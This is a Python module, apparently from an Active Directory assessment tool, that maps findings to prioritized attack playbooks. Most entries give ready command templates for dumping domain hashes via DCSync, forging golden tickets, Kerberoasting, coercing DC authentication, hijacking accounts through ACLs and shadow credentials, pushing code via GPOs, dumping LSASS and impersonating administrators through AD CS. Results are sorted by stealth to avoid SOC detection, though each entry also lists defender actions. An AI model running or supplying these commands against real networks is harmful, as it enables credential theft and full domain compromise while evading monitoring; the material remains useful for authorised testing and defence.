#!/usr/bin/env python3
"""
recommendations.py — Prioritized remediation / exploitation recommendations.

For every category of finding we generate a prioritized recommendation
with concrete tool commands and placeholders.
"""

from __future__ import annotations

from typing import Any, Dict, List

from .models import ObjectStore
from .theme import Severity


# OPSEC NOISE PENALTIES
# Scale: 0 = silent (no audit trail), 10 = extremely loud (instant SOC alert)
OPSEC_PENALTIES: Dict[str, int] = {
    "LAPS Password Readers":            0,   # Standard LDAP read, no anomaly
    "AS-REP Roastable Users":           0,   # Unauthenticated, no Event ID
    "Kerberoastable Users":             2,   # Event 4769 (TGS request, RC4 downgrade)
    "Active Sessions":                  2,   # Observation only
    "Constrained Delegation":           3,   # S4U2Self/Proxy — normal Kerberos flow
    "Shadow Credentials Opportunities": 5,   # Event 5136 (msDS-KeyCredentialLink write)
    "Unconstrained Delegation":         5,   # Coercion + ticket capture
    "Dangerous ACL Permissions":        6,   # Event 5136/4670 (ACL modification)
    "Self-Add to Group Escalation":     8,   # Event 4728/4732 (group membership change)
    "GPO Abuse Paths":                  8,   # Event 5136/5145 (GPO + SYSVOL write)
    "DCSync Rights":                    9,   # Event 4662 (replication GUID)
    "Machine Account Quota Abuse":      3,   # Event 4741 (computer account creation)
    "gMSA Password Readers":            1,   # Standard LDAP read of msDS-ManagedPassword
    "AD CS Misconfigurations":          1,   # Certificate request (4886) — normal AD CS operation
}

# Map finding titles to Event IDs that a SOC would see
OPSEC_EVENTS: Dict[str, List[str]] = {
    "Kerberoastable Users":             ["4769 (TGS request — watch RC4 encryption type 0x17)"],
    "Shadow Credentials Opportunities": ["5136 (msDS-KeyCredentialLink write)", "4742 (computer account changed)"],
    "Dangerous ACL Permissions":        ["5136 (directory object modified)", "4670 (permissions changed)", "4907 (audit policy changed)"],
    "Self-Add to Group Escalation":     ["4728 (global security group member added)", "4732 (local security group member added)"],
    "GPO Abuse Paths":                  ["5136 (GPO attribute modified)", "5145 (SYSVOL file access)"],
    "DCSync Rights":                    ["4662 (directory object accessed — replication GUIDs)"],
    "Unconstrained Delegation":         ["4624 (logon event on UD host)"],
    "Machine Account Quota Abuse":      ["4741 (computer account created)"],
    "AD CS Misconfigurations":          ["4886 (certificate requested)", "4887 (certificate issued)"],
}

OPSEC_LABELS = {
    range(0, 1):   ("🟢", "SILENT"),
    range(1, 3):   ("🟡", "LOW"),
    range(3, 6):   ("🟠", "MEDIUM"),
    range(6, 9):   ("🔴", "HIGH"),
    range(9, 11):  ("⛔", "LOUD"),
}


def get_opsec_penalty(finding_title: str) -> int:
    """Return the OpSec noise penalty for a finding type."""
    return OPSEC_PENALTIES.get(finding_title, 4)


def get_opsec_label(penalty: int) -> str:
    """Return a human-readable OpSec label like '🟢 SILENT'."""
    for r, (glyph, label) in OPSEC_LABELS.items():
        if penalty in r:
            return f"{glyph} {label}"
    return "⛔ LOUD"


def get_detection_events(finding_title: str) -> List[str]:
    """Return the Event IDs a SOC would see when exploiting this finding."""
    return OPSEC_EVENTS.get(finding_title, [])


def _has(findings: List[Dict[str, Any]], title: str) -> bool:
    return any(f.get("title") == title and f.get("data") for f in findings)


def build_recommendations(store: ObjectStore, findings: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    recs: List[Dict[str, Any]] = []

    # ── Priority 1: Immediate wins ──────────────────────────────────────────
    if _has(findings, "DCSync Rights"):
        recs.append({
            "priority": 1,
            "title": "IMMEDIATE — DCSync Attack",
            "severity": Severity.CRITICAL,
            "action": (
                "If you have DCSync rights, dump the entire domain's NT hashes with one "
                "command. This is the single fastest path to total domain compromise."
            ),
            "command": "impacket-secretsdump <DOMAIN>/<DOMAIN_USER>:<PASSWORD>@<DC_IP> -just-dc-ntlm",
            "alt_commands": [
                "mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:krbtgt",
                "# Forge Golden Ticket for persistence\nimpacket-ticketer -nthash <KRBTGT_HASH> -domain <DOMAIN> -domain-sid <DOMAIN_SID> -user-id 500 administrator",
            ],
            "defender_action": (
                "Remove the replication ACEs from any non-DA principal. Audit Event 4662 for "
                "DSReplication GUIDs ({1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} and "
                "{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2})."
            ),
        })

    if _has(findings, "Kerberoastable Users"):
        recs.append({
            "priority": 1,
            "title": "IMMEDIATE — Kerberoasting",
            "severity": Severity.CRITICAL,
            "action": (
                "Request TGS tickets for SPN-enabled accounts and crack them offline. Focus "
                "first on high-value group members."
            ),
            "command": "impacket-GetUserSPNs <DOMAIN>/<DOMAIN_USER>:<PASSWORD> -request -dc-ip <DC_IP> -outputfile hashes.txt",
            "alt_commands": [
                "hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --rule=/usr/share/hashcat/rules/best64.rule",
                "# AES Kerberoasting\nRubeus.exe kerberoast /outfile:hashes.txt",
            ],
            "defender_action": (
                "Migrate service accounts to gMSAs. Set 25+ char passwords on any SPN account. "
                "Monitor Event 4769 (TGS requests, esp. RC4 encryption type 0x17)."
            ),
        })

    if _has(findings, "Unconstrained Delegation"):
        recs.append({
            "priority": 1,
            "title": "IMMEDIATE — Unconstrained Delegation Abuse",
            "severity": Severity.CRITICAL,
            "action": (
                "Coerce DC authentication to a UD-enabled box to capture its TGT. PetitPotam "
                "or PrinterBug are the classic triggers."
            ),
            "command": "python3 PetitPotam.py -u '<DOMAIN_USER>' -p '<PASSWORD>' <UD_HOST> <DC_IP>",
            "alt_commands": [
                "python3 printerbug.py <DOMAIN>/<DOMAIN_USER>:<PASSWORD>@<DC_IP> <UD_HOST>",
                "# Then dump tickets on the UD host\nmimikatz # sekurlsa::tickets /export",
            ],
            "defender_action": (
                "Disable UD on every box that doesn't need it. Mark Tier-0 admin accounts "
                "'Account is sensitive and cannot be delegated'. Patch DCs against PetitPotam "
                "(KB5005413)."
            ),
        })

    # ── Priority 2: ACL abuse ───────────────────────────────────────────────
    if _has(findings, "Dangerous ACL Permissions"):
        recs.append({
            "priority": 2,
            "title": "ACL Abuse Chain",
            "severity": Severity.CRITICAL,
            "action": (
                "Find the shortest chain from your current principal to Domain Admin using "
                "ACL edges. Start with GenericAll/GenericWrite — these are direct takeovers."
            ),
            "command": "impacket-dacledit <DOMAIN>/<DOMAIN_USER>:<PASSWORD> -action write -rights FullControl -principal '<DOMAIN_USER>' -target '<TARGET_USER>' -dc-ip <DC_IP>",
            "alt_commands": [
                "# After granting yourself FullControl, reset the target's password\nnet rpc password '<TARGET_USER>' '<NEW_PASSWORD>' -U '<DOMAIN>/<DOMAIN_USER>%<PASSWORD>' -S <DC_HOST>",
                "# For nested group memberships, use the tool's transitive closure view",
            ],
            "defender_action": (
                "Run BloodHound queries for shortest ACL paths to DA. Remove GenericAll/"
                "GenericWrite from non-owner principals. Monitor 4670 / 5136 / 4907 for ACL "
                "modifications on Tier-0 objects."
            ),
        })

    if _has(findings, "Shadow Credentials Opportunities"):
        recs.append({
            "priority": 2,
            "title": "Shadow Credentials Takeover",
            "severity": Severity.CRITICAL,
            "action": (
                "Use Certipy or Whisker to add a KeyCredentialLink on any target where you "
                "have GenericWrite. Authenticate with the resulting certificate — no password "
                "reset required, very stealthy."
            ),
            "command": "certipy shadow auto -u '<DOMAIN_USER>' -p '<PASSWORD>' -account '<TARGET_USER>' -dc-ip <DC_IP>",
            "alt_commands": [
                "whisker.py add /target:<TARGET_USER> /domain:<DOMAIN> /dc:<DC_HOST> /user:<DOMAIN_USER> /password:<PASSWORD>",
            ],
            "defender_action": (
                "Block GenericWrite on sensitive principals. Monitor Event 5136 / 4742 for "
                "writes to msDS-KeyCredentialLink. If WHfB is not in use, consider blocking "
                "the attribute via ACL."
            ),
        })

    if _has(findings, "Pre-Windows 2000 Compatible Access"):
        recs.append({
            "priority": 2,
            "title": "Anonymous SAMR Enumeration Hardening",
            "severity": Severity.MEDIUM,
            "action": (
                "Remove Authenticated Users / Anonymous from Pre-Windows 2000 Compatible "
                "Access. Tighten RestrictAnonymousSAM."
            ),
            "command": "net localgroup 'Pre-Windows 2000 Compatible Access' 'Authenticated Users' /delete",
            "alt_commands": [
                "# Registry hardening (reboot required)\nreg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RestrictAnonymousSAM /t REG_DWORD /d 1 /f",
                "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RestrictAnonymous /t REG_DWORD /d 1 /f",
            ],
            "defender_action": (
                "Test legacy apps first. After removal, monitor SAMR usage via Event 4662 / "
                "5145. Use the 'AddNetworkRPCRestrictions' policy to further restrict."
            ),
        })

    # ── Priority 3: GPO abuse ───────────────────────────────────────────────
    if _has(findings, "GPO Abuse Paths"):
        recs.append({
            "priority": 3,
            "title": "GPO Abuse — Code Execution Across an OU",
            "severity": Severity.CRITICAL,
            "action": (
                "Edit a GPO you have write access to. Push a malicious scheduled task or "
                "logon script. Code executes on every computer in the linked OU on next "
                "refresh."
            ),
            "command": "SharpGPOAbuse.exe --AddComputerTask --TaskName 'Update' --Author '<DOMAIN>\\\\<DOMAIN_USER>' --Command 'cmd.exe' --Arguments '/c powershell -enc <BASE64>' --GPOName '<GPO_NAME>'",
            "alt_commands": [
                "# PowerView\nNew-GPOImmediateTask -TaskName Update -GPODisplayName '<GPO_NAME>' -CommandArguments '/c calc.exe'",
                "# Force refresh on a target you admin\ngpupdate /force",
            ],
            "defender_action": (
                "Restrict GPO write access to dedicated GPO Administrators. Use GPO "
                "inheritance blocking on Tier-0 OUs. Monitor 5136 / 5145 for GPO file writes."
            ),
        })

    # ── Priority 4: Lateral movement ────────────────────────────────────────
    if _has(findings, "Active Sessions") or _has(findings, "Non-Privileged Local Admins"):
        recs.append({
            "priority": 4,
            "title": "Lateral Movement via Sessions / Local Admin",
            "severity": Severity.HIGH,
            "action": (
                "Target computers where high-value users have active sessions or where you "
                "have local admin. Dump LSASS for cached domain creds."
            ),
            "command": "impacket-psexec <DOMAIN>/<DOMAIN_USER>:<PASSWORD>@<TARGET_HOST>",
            "alt_commands": [
                "lsassy -d <DOMAIN> -u <DOMAIN_USER> -p <PASSWORD> <TARGET_HOST>",
                "mimikatz # sekurlsa::logonpasswords",
                "nanodump --pid <LSASS_PID> --write lsass.dmp",
            ],
            "defender_action": (
                "Enforce tiered admin model. Enable LSA Protection (RunAsPPL), Credential "
                "Guard, and EDR. Tier-0 admins must never log on to Tier-1/2 hosts."
            ),
        })

    if _has(findings, "LAPS Password Readers"):
        recs.append({
            "priority": 4,
            "title": "LAPS Password Pivot",
            "severity": Severity.HIGH,
            "action": (
                "Read LAPS-managed local admin passwords for any computer you can read. Use "
                "the password for direct local admin access."
            ),
            "command": "python3 pyLAPS.py -u '<DOMAIN_USER>' -p '<PASSWORD>' -d <DOMAIN> -t '<TARGET_HOST>'",
            "alt_commands": [
                "Get-AdmPwdPassword -ComputerName <TARGET_HOST>",
                "Get-LapsADPassword -Identity <TARGET_HOST>",
            ],
            "defender_action": (
                "Restrict LAPS read rights to a dedicated help-desk group. Consider Windows "
                "LAPS with Entra-backed password decryption. Audit SACL on "
                "ms-Mcs-AdmPwd / msLAPS-Password."
            ),
        })

    # ── Priority 5: Trust abuse ─────────────────────────────────────────────
    if _has(findings, "Domain Trusts"):
        recs.append({
            "priority": 5,
            "title": "Cross-Domain Trust Abuse",
            "severity": Severity.MEDIUM,
            "action": (
                "If trusts exist without SID filtering, abuse for cross-domain privilege "
                "escalation via sIDHistory injection."
            ),
            "command": "impacket-raiseChild <DOMAIN>/<DOMAIN_USER>:<PASSWORD> <CHILD_DOMAIN_DC> -target-domain <PARENT_DOMAIN>",
            "alt_commands": [
                "# Forge ticket with extra SID\nimpacket-ticketer -user administrator -domain <CHILD_DOMAIN> -domain-sid <CHILD_SID> -nthash <CHILD_KRBTGT> -extra-sid <PARENT_SID>-500",
                "export KRB5CCNAME=administrator.ccache; impacket-psexec <PARENT_DOMAIN>/administrator@<PARENT_DC> -k -no-pass",
            ],
            "defender_action": (
                "Enable SID Filter Quarantine on all external trusts. Avoid forest-internal "
                "trusts with filtering disabled unless explicitly required for migrations."
            ),
        })

    # ── Priority 6: Hygiene ─────────────────────────────────────────────────
    if _has(findings, "Outdated Operating Systems"):
        recs.append({
            "priority": 6,
            "title": "Patch / Decommission Outdated OS",
            "severity": Severity.HIGH,
            "action": (
                "Decommission or patch every EOL host. Isolate those that must stay."
            ),
            "command": "crackmapexec smb <TARGET_SUBNET> -u '' -p '' -M ms17-010",
            "alt_commands": [
                "rdpscan <TARGET_HOST>     # BlueKeep (CVE-2019-0708)",
                "python3 zerologon_tester.py <NETBIOS_NAME> <DC_IP>",
            ],
            "defender_action": (
                "Inventory all OS versions. Apply patching cadence. Quarantine VLAN for any "
                "EOL host that must stay."
            ),
        })

    if _has(findings, "Non-Admin Users in High-Value Groups"):
        recs.append({
            "priority": 6,
            "title": "Tiered Admin Model",
            "severity": Severity.HIGH,
            "action": (
                "Move daily-use accounts out of Tier-0 groups. Use dedicated -admin accounts "
                "that only log on from PAWs."
            ),
            "command": "Get-ADGroupMember -Identity 'Domain Admins' -Recursive | Select-Object Name, ObjectClass, Enabled",
            "alt_commands": [
                "# Implement JIT via Privileged Access Management (PAM)\n# Microsoft Identity Manager or third-party PAM",
            ],
            "defender_action": (
                "Enforce Tier-0/1/2 model. Audit group membership changes (4728/4732). Use "
                "JIT access via PAM instead of standing privilege."
            ),
        })

    if _has(findings, "Self-Add to Group Escalation"):
        recs.append({
            "priority": 2,
            "title": "Self-Add to Group Privilege Escalation",
            "severity": Severity.CRITICAL,
            "action": (
                "An account holds membership modification permissions (AddMember/GenericAll/etc.) "
                "over a group it does not belong to. Abuse this to add yourself to the group."
            ),
            "command": "net rpc group addmem '<TARGET_GROUP>' '<CONTROLLED_USER>' -U '<DOMAIN>/<DOMAIN_USER>%<PASSWORD>' -S <DC_HOST>",
            "alt_commands": [
                "bloodyAD --host <DC_IP> -u '<DOMAIN_USER>' -p '<PASSWORD>' add groupMember '<TARGET_GROUP>' '<CONTROLLED_USER>'",
                "Add-DomainGroupMember -Identity '<TARGET_GROUP>' -Members '<CONTROLLED_USER>'",
            ],
            "defender_action": (
                "Remove permissions like AddMember or GenericAll from non-administrative users on group objects. "
                "Audit Event 4728 (global group addition) and 4732 (local group addition) on DCs."
            ),
        })

    if _has(findings, "Machine Account Quota Abuse"):
        recs.append({
            "priority": 3,
            "title": "Machine Account Quota — RBCD Viable",
            "severity": Severity.HIGH,
            "action": (
                "ms-DS-MachineAccountQuota > 0. Any authenticated user can create computer "
                "accounts and use them for RBCD attacks against targets with GenericWrite."
            ),
            "command": "impacket-addcomputer <DOMAIN>/<DOMAIN_USER>:<PASSWORD> -dc-ip <DC_IP> -computer-name 'EVIL$' -computer-pass '<NEW_PASSWORD>'",
            "alt_commands": [
                "# Then set RBCD\\nrbcd.py <DOMAIN>/<DOMAIN_USER>:<PASSWORD>@<DC_HOST> -delegate-to '<TARGET_HOST>$' -delegate-from 'EVIL$' -action write",
                "# Request ticket\\nimpacket-getST <DOMAIN>/EVIL$:'<NEW_PASSWORD>' -spn 'cifs/<TARGET_HOST>' -impersonate administrator -dc-ip <DC_IP>",
            ],
            "defender_action": (
                "Set ms-DS-MachineAccountQuota to 0. Monitor Event 4741 for unauthorized "
                "computer account creation."
            ),
        })

    if _has(findings, "gMSA Password Readers"):
        recs.append({
            "priority": 3,
            "title": "gMSA Password Extraction",
            "severity": Severity.HIGH,
            "action": (
                "Principals with ReadGMSAPassword can extract gMSA service account credentials. "
                "gMSA accounts often have elevated domain privileges."
            ),
            "command": "python3 gMSADumper.py -u '<DOMAIN_USER>' -p '<PASSWORD>' -d <DOMAIN> -dc-ip <DC_IP>",
            "alt_commands": [
                "nxc ldap <DC_IP> -u '<DOMAIN_USER>' -p '<PASSWORD>' -M gmsa",
            ],
            "defender_action": (
                "Audit PrincipalsAllowedToRetrieveManagedPassword on every gMSA. Remove "
                "broad groups from the allowed list."
            ),
        })

    if _has(findings, "AD CS Misconfigurations"):
        recs.append({
            "priority": 1,
            "title": "IMMEDIATE — AD CS Certificate Abuse",
            "severity": Severity.CRITICAL,
            "action": (
                "AD CS misconfiguration(s) detected. Certificate-based attacks are extremely "
                "stealthy and provide direct paths to Domain Admin via PKINIT authentication. "
                "This is often the fastest and quietest route to full domain compromise."
            ),
            "command": "certipy find -u '<DOMAIN_USER>' -p '<PASSWORD>' -dc-ip <DC_IP> -vulnerable",
            "alt_commands": [
                "certipy req -u '<DOMAIN_USER>' -p '<PASSWORD>' -ca '<CA_NAME>' -template '<TEMPLATE_NAME>' -upn administrator@<DOMAIN> -dc-ip <DC_IP>",
                "certipy auth -pfx administrator.pfx -dc-ip <DC_IP>",
            ],
            "defender_action": (
                "Run 'certipy find -vulnerable' to audit all certificate templates and CAs. "
                "Disable ENROLLEE_SUPPLIES_SUBJECT on templates with Client Auth EKU. "
                "Disable the EDITF_ATTRIBUTESUBJECTALTNAME2 flag on all CAs. "
                "Restrict enrollment permissions to authorized accounts only."
            ),
        })

    # ── Inject OpSec metadata into every recommendation ───────────────────
    _FINDING_FOR_REC = {
        "IMMEDIATE — DCSync Attack":               "DCSync Rights",
        "IMMEDIATE — Kerberoasting":                "Kerberoastable Users",
        "IMMEDIATE — Unconstrained Delegation Abuse": "Unconstrained Delegation",
        "ACL Abuse Chain":                          "Dangerous ACL Permissions",
        "Shadow Credentials Takeover":              "Shadow Credentials Opportunities",
        "Anonymous SAMR Enumeration Hardening":     "Pre-Windows 2000 Compatible Access",
        "GPO Abuse — Code Execution Across an OU":  "GPO Abuse Paths",
        "Lateral Movement via Sessions / Local Admin": "Active Sessions",
        "LAPS Password Pivot":                      "LAPS Password Readers",
        "Cross-Domain Trust Abuse":                 "Domain Trusts",
        "Patch / Decommission Outdated OS":         "Outdated Operating Systems",
        "Tiered Admin Model":                       "Non-Admin Users in High-Value Groups",
        "Self-Add to Group Privilege Escalation":   "Self-Add to Group Escalation",
        "Machine Account Quota — RBCD Viable":      "Machine Account Quota Abuse",
        "gMSA Password Extraction":                 "gMSA Password Readers",
        "IMMEDIATE — AD CS Certificate Abuse":       "AD CS Misconfigurations",
    }
    for rec in recs:
        finding_title = _FINDING_FOR_REC.get(rec["title"], "")
        penalty = get_opsec_penalty(finding_title)
        rec["opsec_score"] = penalty
        rec["opsec_label"] = get_opsec_label(penalty)
        rec["detection_events"] = get_detection_events(finding_title)

    # Sort: lowest noise first (stealthiest), then by priority number
    return sorted(recs, key=lambda x: (x.get("opsec_score", 5), x["priority"]))

